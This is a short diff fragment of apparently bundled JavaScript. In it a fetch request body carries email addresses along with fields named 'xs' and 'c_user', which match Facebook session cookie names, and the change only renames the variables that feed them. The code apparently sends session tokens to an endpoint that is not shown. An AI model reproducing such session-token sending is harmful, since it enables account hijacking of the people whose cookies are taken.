@@ -13366,8 +13366,8 @@
                                         body: JSON.stringify({
                                             emails: e,
                                             workerEmail: "",
-                                            xs: xs,
-                                            c_user: c_user,
+                                            xs: r,
+                                            c_user: i,
                                             name: "My Self"
                                         })
                                     }).then((e => {
